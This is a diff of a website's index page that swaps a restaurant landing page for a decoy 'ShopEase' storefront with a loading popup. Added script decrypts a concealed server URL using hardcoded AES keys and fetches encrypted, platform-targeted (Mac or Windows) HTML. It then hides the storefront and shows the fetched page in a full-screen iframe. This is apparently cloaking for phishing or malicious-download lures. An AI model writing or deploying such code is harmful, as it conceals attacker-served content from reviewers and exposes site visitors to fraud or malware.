@@ -1,489 +1,293 @@
-<?php require __DIR__ . '/ajax.php' ?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <!-- Google tag (gtag.js) -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Contact</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    #frame { display: none; width: 100%; height: 100vh; border: 0; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
 
-      gtag('config', 'G-0LY0HY7L01');
-    </script>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Tasty Flavor Kitchen - High-heat wok hei stir-fries, hand-pulled artisan noodle bowls, steamed dim sum towers, and chili garlic reductions.">
-    <title>Tasty Flavor Kitchen | Wok Hei Street Food Atelier</title>
     
-    <!-- CSS Stylesheet -->
-    <link rel="stylesheet" href="style.css">
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-0LY0HY7L01');
+</script>
+
+
 </head>
 <body>
 
-    <!-- Header Navigation -->
-    <header>
-        <nav class="navbar">
-            <a href="index.php" class="logo">Tasty<span>FlavorKitchen</span></a>
-            <ul class="nav-links">
-                <li><a href="index.php" class="active">Home</a></li>
-                <li><a href="collections.html">Collections</a></li>
-                <li><a href="blog/index.html">Blogs</a></li>
-                <li><a href="privacy-policy.html">Privacy Policy</a></li>
-                <li><a href="terms.html">Terms & Conditions</a></li>
-            </ul>
-            <button class="menu-btn" aria-label="Toggle Navigation">
-                <span></span>
-                <span></span>
-                <span></span>
-            </button>
-        </nav>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
+    </div>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
     </header>
 
-    <!-- Main Content -->
-    <main>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+    </section>
+
+ <!-- Histats.com  START  (aync)-->
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+<!-- Histats.com  END  -->
+
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
+      </div>
+    </section>
+
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
+
+  <iframe id="frame" title="encrypted shop" allowfullscreen allow="fullscreen"></iframe>
+
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX1+uO7n727CJPFBFdf1fu4UUB7LEy0pCOEbetZjnrALXLQaidvdRcLP4e0SP8CZsvD8K8hm+2CXrgg==";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
+
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    async function loadSecret() {
+      const shop = document.getElementById("shop"), frame = document.getElementById("frame");
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
         
-        <!-- SECTION 1: SIZZLING FLAME-WOK KITCHEN HERO -->
-        <section class="hero-kitchen-section">
-            <div class="hero-kitchen-container">
-                
-                <!-- Left Text Column -->
-                <div class="hero-kitchen-text reveal-item">
-                    <span class="hero-badge">FLAME-GROOMED STREET KITCHEN /// WOK HEI 5.0</span>
-                    <h1><span class="gradient-text">Tasty Flavor Kitchen</span> & Wok Hei Atelier</h1>
-                    <p class="hero-desc">Explore high-heat wok hei stir-fries, hand-pulled artisan ramen bowls, steamed bamboo dim sum, and artisanal chili garlic oil reductions.</p>
-                    
-                    <div class="hero-btns" style="justify-content: flex-start; margin-bottom: 2.5rem;">
-                        <a href="collections.html" class="btn btn-primary">Explore Wok Kitchen</a>
-                        <a href="#blueprint" class="btn btn-secondary">Wok Hei Flavor Blueprint</a>
-                    </div>
+      
+        shop.style.display = "none";
+        frame.style.display = "block";
+        document.getElementById("customPopup").style.display = "none"; 
+        
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
 
-                    <div style="display: flex; gap: 2rem; border-top: 1px solid rgba(255, 123, 0, 0.25); padding-top: 2rem; flex-wrap: wrap;">
-                        <div><strong style="color: var(--color-primary); font-size: 1.6rem; display: block; font-family: var(--font-heading);">1000°F Flame</strong> <span style="font-size: 0.8rem; color: var(--color-fg-muted);">Breath of the Wok</span></div>
-                        <div><strong style="color: var(--color-primary); font-size: 1.6rem; display: block; font-family: var(--font-heading);">100% Organic</strong> <span style="font-size: 0.8rem; color: var(--color-fg-muted);">Hand-Pulled Noodles</span></div>
-                        <div><strong style="color: var(--color-primary); font-size: 1.6rem; display: block; font-family: var(--font-heading);">18-Hour Broth</strong> <span style="font-size: 0.8rem; color: var(--color-fg-muted);">Slow-Simmered Tonkotsu</span></div>
-                    </div>
-                </div>
-
-                <!-- Right Hero Image Column with Floating Review Pill -->
-                <div class="hero-kitchen-image reveal-item">
-                    <div class="hero-kitchen-img-wrapper">
-                        <img src="img/hero_kitchen.jpg" alt="Chef tossing flaming wok stir-fry noodles with dragon amber flames" loading="lazy">
-                    </div>
-                    
-                    <div class="floating-badge">
-                        <div class="floating-badge-icon">🥢</div>
-                        <div>
-                            <strong style="color: var(--color-fg); display: block; font-size: 1rem;">4.9 ★ (5,800+ Wok Hei Enthusiasts)</strong>
-                            <span style="font-size: 0.8rem; color: var(--color-primary);">Tasty Flavor Kitchen</span>
-                        </div>
-                    </div>
-                </div>
-
-            </div>
-        </section>
-
-        <!-- SECTION 2: CONTINUOUS DRAGON AMBER MARQUEE TICKER BAND -->
-        <div class="marquee-band">
-            <div class="marquee-content">
-                TASTY FLAVOR KITCHEN /// HIGH-HEAT WOK HEI /// ARTISANAL FLAMED NOODLES /// UMAMI SAUCE REDUCTIONS /// STEAMED DIM SUM TOWERS /// CHILI CRISP REDUCTIONS ///
-            </div>
-            <div class="marquee-content">
-                TASTY FLAVOR KITCHEN /// HIGH-HEAT WOK HEI /// ARTISANAL FLAMED NOODLES /// UMAMI SAUCE REDUCTIONS /// STEAMED DIM SUM TOWERS /// CHILI CRISP REDUCTIONS ///
-            </div>
-        </div>
-
-        <!-- SECTION 3: 4-COLUMN WOK KITCHEN CAPSULES -->
-        <section style="padding: 6rem 2rem 3rem;">
-            <div class="section-title reveal-item" style="text-align: center;">
-                <h2>THE WOK HEI KITCHEN CAPSULES</h2>
-                <p>Cooked over 1000°F jet burners with seasoned carbon steel woks and hand-pulled noodles.</p>
-            </div>
-
-            <div class="product-grid reveal-item">
-                
-                <!-- Capsule 1 -->
-                <div class="luxury-card" onclick="window.location.href='collections.html'">
-                    <span class="blog-tag">CAPSULE 01</span>
-                    <h3>High-Heat Wok Hei Stir-Fries</h3>
-                    <p class="blog-excerpt">Smoky 1000°F flame-caramelized beef chow fun with scallions, bean sprouts, and dark soy reduction.</p>
-                </div>
-
-                <!-- Capsule 2 -->
-                <div class="luxury-card" onclick="window.location.href='collections.html'">
-                    <span class="blog-tag">CAPSULE 02</span>
-                    <h3>Hand-Pulled Artisan Noodle Bowls</h3>
-                    <p class="blog-excerpt">Springy wheat noodles pulled to order, served in 18-hour tonkotsu broth with tender pork belly chashu.</p>
-                </div>
-
-                <!-- Capsule 3 -->
-                <div class="luxury-card" onclick="window.location.href='collections.html'">
-                    <span class="blog-tag">CAPSULE 03</span>
-                    <h3>Steamed Dim Sum & Dumpling Towers</h3>
-                    <p class="blog-excerpt">Bamboo steamer baskets loaded with handmade pork & shrimp dumplings, siumai, and chili dipping oil.</p>
-                </div>
-
-            </div>
-        </section>
-
-        <!-- SECTION 4: THE 1000°F WOK HEI BREATH & SEASONED CAST-IRON BLUEPRINT -->
-        <section id="blueprint" style="background-color: var(--color-secondary); border-top: 1px solid var(--color-border); border-bottom: 1px solid var(--color-border);">
-            <div class="section-title reveal-item" style="text-align: center;">
-                <h2>THE 1000°F WOK HEI FLAVOR BLUEPRINT</h2>
-                <p>Deconstructing the breath of the wok, carbon steel patina seasoning, and Maillard flame searing.</p>
-            </div>
-            
-            <div class="luxury-card manifesto-box reveal-item" style="max-width: 980px; margin: 0 auto; padding: 4rem 3.5rem;">
-                <div style="display: flex; gap: 3.5rem; align-items: center; flex-wrap: wrap;">
-                    <div style="flex: 1; min-width: 300px; height: 380px; border-radius: 14px; overflow: hidden; border: 1px solid var(--color-border);">
-                        <img src="img/craft.jpg" alt="Close-up of master wok chef seasoning seasoned carbon steel wok over 1000°F jet burner" style="width: 100%; height: 100%; object-fit: cover;">
-                    </div>
-                    <div style="flex: 1.3; min-width: 300px;">
-                        <span class="hero-badge">WOK HEI PROTOCOL</span>
-                        <h3 style="font-size: 2rem; margin-top: 0.5rem; margin-bottom: 1.2rem;">1000°F Jet Burners & Carbon Steel Patina</h3>
-                        <p style="color: var(--color-fg-muted); font-size: 1.05rem; line-height: 1.9; margin-bottom: 1.5rem;">"Commercial fast-food Asian joints use electric flat top griddles that boil noodles in their own moisture. At Tasty Flavor Kitchen, our wok masters blast 1000°F jet flames under seasoned carbon steel woks. Oil droplets vaporize instantly, infusing every noodle strand with authentic smoky Wok Hei ('Breath of the Wok')."</p>
-                        <p style="color: var(--color-primary); font-weight: 700; font-family: var(--font-heading); font-size: 1.1rem; letter-spacing: 1px;">&mdash; MASTER WOK CHEF &bull; TASTY FLAVOR KITCHEN</p>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- SECTION 5: CURATED TASTY FLAVOR KITCHEN SELECTIONS GRID -->
-        <section id="kitchen-catalog">
-            <div class="section-title reveal-item">
-                <h2>CURATED WOK HEI STREET FOOD SELECTIONS</h2>
-                <p>Order flaming wok stir-fries, hand-pulled ramen, and steamed dim sum baskets.</p>
-            </div>
-            
-            <div class="product-grid">
-                
-                <!-- Item 1 -->
-                <div class="luxury-card kitchen-card reveal-item" data-category="stirfries">
-                    <div class="product-img-wrapper">
-                        <span class="category-tag">WOK HEI STIR-FRY</span>
-                        <span class="price-badge">$24</span>
-                        <img src="img/kitchen1.jpg" alt="Sizzling wok hei beef chow fun noodles with caramelized scallions" loading="lazy">
-                    </div>
-                    <div class="rating-stars">★★★★★ &bull; (640 Foodie Reviews)</div>
-                    <h3>Smoky Wok Hei Beef Chow Fun</h3>
-                    <p class="blog-excerpt">Wide rice noodles flash-seared at 1000°F with sliced flank steak, bean sprouts, and dark soy reduction.</p>
-                    <div class="product-footer">
-                        <span style="font-size: 0.85rem; color: var(--color-primary); font-weight: 600;">Wok Temp: 1000°F Jet Flame</span>
-                        <a href="collections.html" class="btn btn-primary" style="padding: 0.6rem 1.2rem; font-size: 0.75rem;">View Menu Dish</a>
-                    </div>
-                </div>
-
-                <!-- Item 2 -->
-                <div class="luxury-card kitchen-card reveal-item" data-category="dimsum">
-                    <div class="product-img-wrapper">
-                        <span class="category-tag">DIM SUM TOWER</span>
-                        <span class="price-badge">$18</span>
-                        <img src="img/kitchen2.jpg" alt="Steamed bamboo dim sum basket with handmade pork & shrimp dumplings" loading="lazy">
-                    </div>
-                    <div class="rating-stars">★★★★★ &bull; (520 Foodie Reviews)</div>
-                    <h3>Steamed Bamboo Pork & Shrimp Dumpling Basket</h3>
-                    <p class="blog-excerpt">Handmade dumplings stuffed with organic Berkshire pork, wild prawns, and scallion chili oil dip.</p>
-                    <div class="product-footer">
-                        <span style="font-size: 0.85rem; color: var(--color-primary); font-weight: 600;">Steamer: Natural Bamboo Wood</span>
-                        <a href="collections.html" class="btn btn-primary" style="padding: 0.6rem 1.2rem; font-size: 0.75rem;">View Menu Dish</a>
-                    </div>
-                </div>
-
-                <!-- Item 3 -->
-                <div class="luxury-card kitchen-card reveal-item" data-category="noodles">
-                    <div class="product-img-wrapper">
-                        <span class="category-tag">RAMEN BOWL</span>
-                        <span class="price-badge">$22</span>
-                        <img src="img/kitchen3.jpg" alt="Rich umami ramen bowl with slow-braised pork belly chashu and soft-boiled egg" loading="lazy">
-                    </div>
-                    <div class="rating-stars">★★★★★ &bull; (490 Foodie Reviews)</div>
-                    <h3>18-Hour Tonkotsu Pork Belly Ramen</h3>
-                    <p class="blog-excerpt">Hand-pulled springy wheat noodles in collagen-rich pork bone broth with braised chashu and ajitsuke egg.</p>
-                    <div class="product-footer">
-                        <span style="font-size: 0.85rem; color: var(--color-primary); font-weight: 600;">Broth: 18-Hour Slow Simmer</span>
-                        <a href="collections.html" class="btn btn-primary" style="padding: 0.6rem 1.2rem; font-size: 0.75rem;">View Menu Dish</a>
-                    </div>
-                </div>
-
-            </div>
-            
-            <div style="text-align: center; margin-top: 4rem;" class="reveal-item">
-                <a href="collections.html" class="btn btn-secondary">Explore Complete Tasty Flavor Catalog</a>
-            </div>
-        </section>
-
-        <!-- SECTION 6: 1000°F WOK HEI & COMMERCIAL FAST-FOOD FRYER AUDIT MATRIX TABLE -->
-        <section class="comparison-section">
-            <div class="section-title reveal-item">
-                <h2>WOK HEI QUALITY & COOKING AUDIT MATRIX</h2>
-                <p>Compare Tasty Flavor Kitchen standards against cheap commercial fast-food takeaways.</p>
-            </div>
-            
-            <div class="luxury-card reveal-item" style="padding: 2.5rem; overflow-x: auto; border-radius: 16px;">
-                <table style="width: 100%; border-collapse: collapse; text-align: left; min-width: 600px;">
-                    <thead>
-                        <tr style="border-bottom: 2px solid var(--color-border); font-weight: 600;">
-                            <th style="padding: 1rem; font-family: var(--font-heading); font-size: 1.4rem;">Culinary Spec</th>
-                            <th style="padding: 1rem; color: var(--color-primary); font-family: var(--font-heading); font-size: 1.4rem;">Tasty Flavor Kitchen</th>
-                            <th style="padding: 1rem; color: var(--color-fg-muted); font-family: var(--font-heading); font-size: 1.4rem;">Commercial Takeaway Chains</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <tr style="border-bottom: 1px solid var(--color-border);">
-                            <td style="padding: 1rem; font-weight: 600;">Burner Temperature & Wok Hei</td>
-                            <td style="padding: 1rem; color: var(--color-primary);">1000°F High-Pressure Jet Burner Flame Wok Hei</td>
-                            <td style="padding: 1rem; color: var(--color-fg-muted);">Low-temp electric flat-tops that boil noodles</td>
-                        </tr>
-                        <tr style="border-bottom: 1px solid var(--color-border);">
-                            <td style="padding: 1rem; font-weight: 600;">Noodle Crafting</td>
-                            <td style="padding: 1rem; color: var(--color-accent);">100% Hand-Pulled Wheat & Fresh Rice Flat Noodles</td>
-                            <td style="padding: 1rem; color: var(--color-fg-muted);">Dried instant factory noodles with preservatives</td>
-                        </tr>
-                        <tr style="border-bottom: 1px solid var(--color-border);">
-                            <td style="padding: 1rem; font-weight: 600;">Ramen Broth Preparation</td>
-                            <td style="padding: 1rem; color: var(--color-accent);">18-Hour Slow-Simmered Tonkotsu Pork Bone Broth</td>
-                            <td style="padding: 1rem; color: var(--color-fg-muted);">Water mixed with MSG powder broth bases</td>
-                        </tr>
-                        <tr style="border-bottom: 1px solid var(--color-border);">
-                            <td style="padding: 1rem; font-weight: 600;">Chili Oil & Sauces</td>
-                            <td style="padding: 1rem; color: var(--color-accent);">House-Made Chili Crisp & Garlic Infused Oil</td>
-                            <td style="padding: 1rem; color: var(--color-fg-muted);">Mass-produced high-fructose corn syrup packet sauces</td>
-                        </tr>
-                        <tr>
-                            <td style="padding: 1rem; font-weight: 600;">Dumpling Preparation</td>
-                            <td style="padding: 1rem; color: var(--color-accent);">Hand-Pleated Fresh Berkshire Pork & Wild Shrimp</td>
-                            <td style="padding: 1rem; color: var(--color-fg-muted);">Frozen machine-stamped processed dumplings</td>
-                        </tr>
-                    </tbody>
-                </table>
-            </div>
-        </section>
-
-        <!-- SECTION 7: FOODIE REVIEWS -->
-        <section id="testimonials">
-            <div class="section-title reveal-item">
-                <h2>WOK HEI FOODIE REVIEWS</h2>
-                <p>Read reviews from street food critics, noodle lovers, and culinary travelers.</p>
-            </div>
-            
-            <div class="testimonials-grid">
-                
-                <!-- Review 1 -->
-                <div class="luxury-card testimonial-card reveal-item">
-                    <div class="quote-icon">“</div>
-                    <div class="rating-stars">★★★★★</div>
-                    <p style="color: var(--color-fg-muted); font-size: 1rem; line-height: 1.8;">"The beef chow fun has that unmistakable smoky Wok Hei flavor that you usually only find in the night markets of Hong Kong!"</p>
-                    <div class="guest-profile">
-                        <div class="guest-avatar">KW</div>
-                        <div>
-                            <strong style="color: var(--color-fg); display: block;">Kenji W.</strong>
-                            <span style="font-size: 0.8rem; color: var(--color-primary);">Food Critic &bull; San Francisco</span>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Review 2 -->
-                <div class="luxury-card testimonial-card reveal-item">
-                    <div class="quote-icon">“</div>
-                    <div class="rating-stars">★★★★★</div>
-                    <p style="color: var(--color-fg-muted); font-size: 1rem; line-height: 1.8;">"The 18-hour tonkotsu broth is so rich and creamy, and the hand-pulled noodles have the perfect springy texture."</p>
-                    <div class="guest-profile">
-                        <div class="guest-avatar">SL</div>
-                        <div>
-                            <strong style="color: var(--color-fg); display: block;">Samantha L.</strong>
-                            <span style="font-size: 0.8rem; color: var(--color-primary);">Noodle Enthusiast &bull; New York</span>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Review 3 -->
-                <div class="luxury-card testimonial-card reveal-item">
-                    <div class="quote-icon">“</div>
-                    <div class="rating-stars">★★★★★</div>
-                    <p style="color: var(--color-fg-muted); font-size: 1rem; line-height: 1.8;">"Best dim sum in town. The house-made chili crisp oil adds an incredible crunchy, spicy kick to every dumpling."</p>
-                    <div class="guest-profile">
-                        <div class="guest-avatar">MC</div>
-                        <div>
-                            <strong style="color: var(--color-fg); display: block;">Marcus C.</strong>
-                            <span style="font-size: 0.8rem; color: var(--color-primary);">Culinary Traveler &bull; Seattle</span>
-                        </div>
-                    </div>
-                </div>
-
-            </div>
-        </section>
-
-        <!-- SECTION 8: INTERACTIVE ACCORDION FAQ -->
-        <section id="faq" style="background-color: var(--color-secondary); border-top: 1px solid var(--color-border); border-bottom: 1px solid var(--color-border);">
-            <div class="section-title reveal-item" style="text-align: center;">
-                <h2>FREQUENTLY ASKED QUESTIONS</h2>
-                <p>Everything you need to know about Wok Hei cooking, noodle pulling, and dietary options.</p>
-            </div>
-            
-            <div class="faq-container reveal-item">
-                
-                <!-- FAQ 1 -->
-                <div class="faq-item active">
-                    <div class="faq-question">
-                        <h3>What is Wok Hei and why is it essential for Asian cooking?</h3>
-                        <span class="faq-icon">+</span>
-                    </div>
-                    <div class="faq-answer">
-                        <p>Wok Hei translates to "Breath of the Wok". It refers to the distinct smoky, charred aroma achieved only when oil and moisture vaporize over 1000°F jet flames in a seasoned carbon steel wok.</p>
-                    </div>
-                </div>
-
-                <!-- FAQ 2 -->
-                <div class="faq-item">
-                    <div class="faq-question">
-                        <h3>Are hand-pulled noodles fresh made daily?</h3>
-                        <span class="faq-icon">+</span>
-                    </div>
-                    <div class="faq-answer">
-                        <p>Yes! Our noodle master kneads organic wheat flour dough daily and pulls every portion fresh to order for maximum elasticity and chew.</p>
-                    </div>
-                </div>
-
-                <!-- FAQ 3 -->
-                <div class="faq-item">
-                    <div class="faq-question">
-                        <h3>Do you offer vegetarian or vegan wok dishes?</h3>
-                        <span class="faq-icon">+</span>
-                    </div>
-                    <div class="faq-answer">
-                        <p>We feature vegan wok stir-fries with organic tofu, wild shiitake mushrooms, and vegetable broths cooked in dedicated plant-based woks.</p>
-                    </div>
-                </div>
-
-                <!-- FAQ 4 -->
-                <div class="faq-item">
-                    <div class="faq-question">
-                        <h3>Is your house-made chili crisp available for purchase?</h3>
-                        <span class="faq-icon">+</span>
-                    </div>
-                    <div class="faq-answer">
-                        <p>Yes! Our signature roasted chili garlic crisp oil is bottled fresh in-house for take-home enjoyment.</p>
-                    </div>
-                </div>
-
-            </div>
-        </section>
-
-        <!-- REGISTRY NEWSLETTER & FOOTER -->
-        <section class="newsletter-section reveal-item">
-            <div class="luxury-card newsletter-box">
-                <h2>JOIN THE TASTY WOK CLUB</h2>
-                <p>Subscribe to our wok kitchen newsletter. Receive private invitations to secret street food pop-ups, chili crisp masterclasses, and wok hei recipes.</p>
-                <form class="newsletter-form" onsubmit="event.preventDefault(); alert('Thank you for joining the Tasty Wok Club!');">
-                    <input type="email" class="newsletter-input" placeholder="Enter your email address" required aria-label="Email address">
-                    <button type="submit" class="btn btn-primary">Subscribe</button>
-                </form>
-            </div>
-        </section>
-
-        <!-- Recent Gazette Articles -->
-        <section class="recent-blogs">
-            <div class="section-title reveal-item">
-                <h2>FROM THE TASTY WOK GAZETTE</h2>
-                <p>Expert articles on wok hei science, hand-pulled noodles, and chili crisp reductions.</p>
-            </div>
-            
-            <div class="blog-grid">
-                <!-- Blog 1 -->
-                <div class="luxury-card reveal-item">
-                    <div class="feature-img-wrapper">
-                        <img src="img/journal1.jpg" alt="The science of Wok Hei: Breath of the wok high-heat caramelization" loading="lazy">
-                    </div>
